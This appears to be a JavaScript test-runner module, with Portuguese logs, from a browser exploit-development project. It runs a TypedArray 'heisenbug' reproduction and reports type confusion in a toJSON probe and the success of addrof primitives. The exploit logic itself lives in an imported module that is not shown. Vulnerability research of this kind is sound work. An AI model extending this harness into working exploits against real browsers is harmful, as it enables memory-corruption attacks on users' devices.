// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_FixRefErrorAndRevisitProbeReturn,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_FixRefErrorAndRevisitProbeReturn";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (FixRefErrorAndRevisitProbeReturn) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_FixRefErrorAndRevisitProbeReturn(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`   Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis)}`, "dev_verbose");
    }
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-FRPR) ERR: ${result.errorOccurred.name}`;
        if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
             logS3(`     NOTA: TypeError de estrutura circular ocorreu. Isso pode ser esperado se object_to_leak_A/B foram atribuídos ao objeto de detalhes que foi então serializado.`, "info");
        }
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedByLastProbe = false;
        if (result.toJSON_details && 
            result.toJSON_details.this_type === "[object Object]") { 
            heisenbugConfirmedByLastProbe = true;
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
             logS3(`     ADDROF A (from Output/Details) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
             logS3(`     ADDROF A (from Output/Details) FALHOU: ${result.addrof_A_result.msg}`, heisenbugConfirmedByLastProbe ? "warn" : "error", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
             logS3(`     ADDROF B (from Output/Details) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
             logS3(`     ADDROF B (from Output/Details) FALHOU: ${result.addrof_B_result.msg}`, heisenbugConfirmedByLastProbe ? "warn" : "error", FNAME_RUNNER);
        }

        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA ÚLTIMA SONDA: ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-FRPR) toJSON_ERR`;
        } else if (heisenbugConfirmedByLastProbe) {
            logS3(`     !!!! TYPE CONFUSION NO 'this' DA ÚLTIMA SONDA OBSERVADA !!!! Call #${result.toJSON_details.call_number}, Tipo: ${result.toJSON_details.this_type}`, "critical", FNAME_RUNNER);
            // ... (outros logs de detalhes da sonda se necessário) ...

            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-FRPR) TC OK, Addr Fail`;
            } else { 
                 document.title = `Heisenbug (TypedArray-FRPR) AddrInOutput SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-FRPR) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (FixRefErrorAndRevisitProbeReturn) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (FixRefErrorAndRevisitProbeReturn) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V35_FRPR} Concluído`;
        }
    }
}
